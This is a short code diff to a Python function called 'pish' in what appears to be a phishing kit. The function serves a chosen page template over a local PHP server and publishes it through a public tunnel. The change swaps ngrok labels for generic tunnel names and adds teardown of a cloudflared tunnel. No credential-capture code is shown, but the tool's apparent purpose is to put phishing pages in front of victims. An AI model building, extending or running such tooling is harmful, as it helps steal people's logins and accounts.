@@ -38,11 +38,11 @@ def pish(selected_template):
     template_path = os.path.join("templates", selected_template)
 
     local_ip = utils.getip()
-    ngrok_url = dynamic_url.re_url()
+    public_url = dynamic_url.re_url()
 
     print()
     print(f"{Fore.CYAN + Style.BRIGHT}[🌐 Localhost URL]{Style.RESET_ALL}   ➤  {Fore.YELLOW}http://{local_ip}/{selected_template}/")
-    print(f"{Fore.GREEN + Style.BRIGHT}[🚀 Ngrok Public URL]{Style.RESET_ALL} ➤  {Fore.MAGENTA}{ngrok_url}/{selected_template}/")
+    print(f"{Fore.GREEN + Style.BRIGHT}[🚀 Public Tunnel URL]{Style.RESET_ALL} ➤  {Fore.MAGENTA}{public_url}/{selected_template}/")
     print(template_path)
 
     # Function to run PHP server
@@ -70,3 +70,8 @@ def pish(selected_template):
     if input(f"{Fore.RED}⛔ Press 0 to stop the PHP server and return to menu: {Style.RESET_ALL}\n").strip() == "0":
         print(f"{Fore.YELLOW}🛑 Stopping PHP server...{Style.RESET_ALL}")
         os.system("pkill -f 'php -S'")  # Works on Unix/macOS. For Windows, use .terminate() with stored process.
+        # also tear down the cloudflared tunnel
+        try:
+            dynamic_url.stop_tunnel()
+        except AttributeError:
+            pass
